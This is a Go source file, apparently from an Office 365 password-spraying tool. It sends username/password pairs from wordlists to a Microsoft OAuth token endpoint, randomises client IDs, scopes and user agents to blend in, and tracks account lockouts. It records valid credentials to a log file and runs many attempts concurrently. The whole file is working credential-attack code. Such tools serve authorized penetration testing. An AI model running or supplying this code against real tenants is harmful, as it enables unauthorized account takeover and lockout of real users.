package spray

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
	"sync"

	"github.com/fatih/color"
	"github.com/lexcf/o365sprayer/o365sprayer/constants"
	"github.com/lexcf/o365sprayer/o365sprayer/logging"
)

func SprayManagedO365(
	domainName string,
	email string,
	password string,
	command string,
	maxLockouts int,
	file *os.File,
) {

	defer func() {
		// Recover from panic and log the error if any
		if r := recover(); r != nil {
			color.Red("[!] Panic occurred: %v", r)
			log.Println("[!] Panic: ", r)
		}
	}()

	getOauthTokenRequestJSON := url.Values{}
	getOauthTokenRequestJSON.Add("resource", constants.RESOURCES[rand.Intn(len(constants.RESOURCES))])
	getOauthTokenRequestJSON.Add("client_id", constants.CLIENT_IDS[constants.GetMapItemRandKey(constants.CLIENT_IDS)])
	getOauthTokenRequestJSON.Add("grant_type", constants.GRANT_TYPE)
	getOauthTokenRequestJSON.Add("scope", constants.SCOPES[rand.Intn(len(constants.SCOPES))])
	getOauthTokenRequestJSON.Add("username", email)
	getOauthTokenRequestJSON.Add("password", password)
	client := &http.Client{}
	req, err := http.NewRequest("POST", constants.GET_OAUTH_TOKEN, strings.NewReader(getOauthTokenRequestJSON.Encode()))
	req.Header.Add("User-Agent", constants.USER_AGENTS[rand.Intn(len(constants.USER_AGENTS))])
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	var getOauthTokenResponseJSON constants.GetOauthTokenResponseJSON
	json.Unmarshal(body, &getOauthTokenResponseJSON)
	if resp.StatusCode == 200 {
		go sprayCounter()
		color.Green("[+] Valid Credential : " + email + " - " + password)
		logging.LogSprayedAccount(file, email, password)
	}
	checkError := false
	if len(getOauthTokenResponseJSON.ErrorCodes) > 0 {
		checkError = true
	}
	if checkError {
		if getOauthTokenResponseJSON.ErrorCodes[0] == 50053 {
			go accountLocked()
			color.Cyan("[*] Account Locked Out : " + email)
			if lockedAccounts == maxLockouts {
				color.Red("[-] Reached Maximum Account Lockouts. Exiting !")
				os.Exit(-1)
			}
		}
		if command == "standalone" && resp.StatusCode != 200 && getOauthTokenResponseJSON.ErrorCodes[0] != 50053 {
			color.Red("[+] Invalid Credential : " + email + " - " + password)
		}
	}

	go userChecked()

}


//TODO multithreading
func SprayEmailsManagedO365(
	domainName string,
	email string,
	emailFilePath string,
	password string,
	passwordFilePath string,
	delay float64,
	lockout int,
	lockoutDelay int,
	maxLockouts int,
	threads int,
) {	


	color.Yellow("[+] Spraying For O365 Emails - Managed")
	timeStamp := strconv.Itoa(time.Now().Year()) + strconv.Itoa(int(time.Now().Month())) + strconv.Itoa(int(time.Now().Hour())) + strconv.Itoa(int(time.Now().Minute())) + strconv.Itoa(int(time.Now().Second()))
	fileName := domainName + "_spray_" + timeStamp
	logFile, err := os.OpenFile((fileName), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Could not open " + fileName)
		return
	}
	defer logFile.Close()
	// 1 email
	if len(email) > 0 {
		// 1 password
		if len(password) > 0 {
			SprayManagedO365(
				domainName,
				email,
				password,
				"standalone",
				maxLockouts,
				logFile,
			)
		}
		//passwords from file
		if len(password) == 0 && len(passwordFilePath) > 0 {
			var lockoutCount = 0
			file, err := os.Open(passwordFilePath)
			if err != nil {
				log.Fatal(err)
			}
			defer file.Close()
			scanner := bufio.NewScanner(file)
			for scanner.Scan() {
				if lockoutCount == (lockout - 1) {
					color.Blue("[+] Cooling Down Lockout Time Period For " + strconv.Itoa(lockoutDelay) + " minutes")
					time.Sleep(time.Duration(lockoutDelay) * time.Minute)
					lockoutCount = 0
				}
				lockoutCount += 1
				SprayManagedO365(
					domainName,
					email,
					scanner.Text(),
					"file",
					maxLockouts,
					logFile,
				)
				time.Sleep(time.Duration(delay))
			}
			if err := scanner.Err(); err != nil {
				log.Fatal(err)
			}
			if sprayedUsers > 0 {
				color.Yellow("[+] " + strconv.Itoa(sprayedUsers) + " Valid O365 Credentials Found !")
			} else {
				color.Red("[-] No Valid O365 Credentials Found !")
			}
		}
	}
	//emails from file
	if len(email) == 0 && len(emailFilePath) > 0 {
		// 1 password
		if len(password) > 0 {
			file, err := os.Open(emailFilePath)
			if err != nil {
				log.Fatal(err)
			}
			defer file.Close()
			scanner := bufio.NewScanner(file)

			// Создаем канал с размерами буфера, чтобы ограничить количество одновременно работающих горутин
			concurrentLimit := threads
			sem := make(chan struct{}, concurrentLimit)
			// Для ожидания завершения всех горутин
			var wg sync.WaitGroup

			for scanner.Scan() {
				wg.Add(1)

				go func(email string) {
					defer wg.Done()

					// Пытаемся захватить место в канале (блокирует, если превышен лимит)
					sem <- struct{}{}
					defer func() { <-sem }()

					SprayManagedO365(
						domainName,
						email,
						password,
						"file",
						maxLockouts,
						logFile,
					)

				fmt.Printf("\rProgress: [%3d]", checkedUsers)

				}(scanner.Text())	

				time.Sleep(time.Duration(delay))
			}
			if err := scanner.Err(); err != nil {
				log.Fatal(err)
			}

			wg.Wait()

			if sprayedUsers > 0 {
				color.Yellow("[+] " + strconv.Itoa(sprayedUsers) + " Valid O365 Credentials Found !")
			} else {
				color.Red("[-] No Valid O365 Credentials Found !")
			}
		}

		//passwords from file
		if len(password) == 0 && len(passwordFilePath) > 0 {
			//lockoutCount := 0
			passFile, err := os.Open(passwordFilePath)
			if err != nil {
				log.Fatal(err)
			}
			defer passFile.Close()
			passScanner := bufio.NewScanner(passFile)

			concurrentLimit := threads
			sem := make(chan struct{}, concurrentLimit)
			var wg sync.WaitGroup

			for passScanner.Scan() {
				/*if lockoutCount == (lockout - 1) {
					color.Blue("[+] Cooling Down Lockout Time Period For " + strconv.Itoa(lockoutDelay) + " minutes")
					time.Sleep(time.Duration(lockoutDelay) * time.Minute)
					lockoutCount = 1
				}
				lockoutCount += 1*/
				emailFile, err := os.Open(emailFilePath)
				if err != nil {
					log.Fatal(err)
				}
				defer emailFile.Close()
				emailScanner := bufio.NewScanner(emailFile)
				
				for emailScanner.Scan() {

					wg.Add(1)

					go func(email string, password string) {
						defer wg.Done()
						sem <- struct{}{}
						defer func() { <-sem }()

						SprayManagedO365(
							domainName,
							email,
							password,
							"file",
							maxLockouts,
							logFile,
						)
						fmt.Printf("\rProgress: [%3s:%3d]", password, checkedUsers)
					
						}(emailScanner.Text(), passScanner.Text())
					
					time.Sleep(time.Duration(delay))
				}
				if err := emailScanner.Err(); err != nil {
					log.Fatal(err)
				}
				wg.Wait()
			}
			if err := passScanner.Err(); err != nil {
				log.Fatal(err)
			}
			if sprayedUsers > 0 {
				color.Yellow("[+] " + strconv.Itoa(sprayedUsers) + " Valid O365 Emails Found !")
			} else {
				color.Red("[-] No Valid O365 Email Found !")
			}
		}
	}
}
